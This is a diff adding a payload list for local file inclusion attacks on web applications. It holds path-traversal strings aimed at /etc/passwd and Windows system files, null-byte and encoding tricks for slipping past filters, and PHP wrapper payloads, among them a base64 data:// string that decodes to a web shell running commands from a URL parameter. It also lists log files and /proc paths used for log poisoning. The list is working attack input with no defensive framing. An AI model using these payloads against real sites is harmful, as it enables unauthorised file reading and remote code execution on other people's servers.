@@ -1,0 +1,38 @@
+# Comprehensive LFI (Local File Inclusion) Payloads
+
+## 1. Standard Arbitrary File Read
+../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../Windows/win.ini
+/etc/passwd
+C:\Windows\System32\drivers\etc\hosts
+
+## 2. Null Byte & Appends Bypass
+../../../etc/passwd%00
+../../../etc/passwd\x00
+../../../etc/passwd%00.html
+../../../etc/passwd?.png
+../../../etc/passwd#.jpg
+
+## 3. Filters Evasion (Double Encoding, Overlong UTF-8)
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
+.////.////.////.////.////.////etc/passwd
+....//....//....//....//....//etc/passwd
+
+## 4. PHP Wrappers
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+expect://id
+zip://uploads/shell.zip#shell.php
+phar://uploads/shell.phar/shell.php
+php://input  (Requires intercepting POST body and feeding code, eg `<?php system('id');?>`)
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+## 5. Linux Log Poisoning Paths
+/var/log/apache2/access.log
+/var/log/httpd-access.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/proc/self/environ
+/proc/self/fd/0
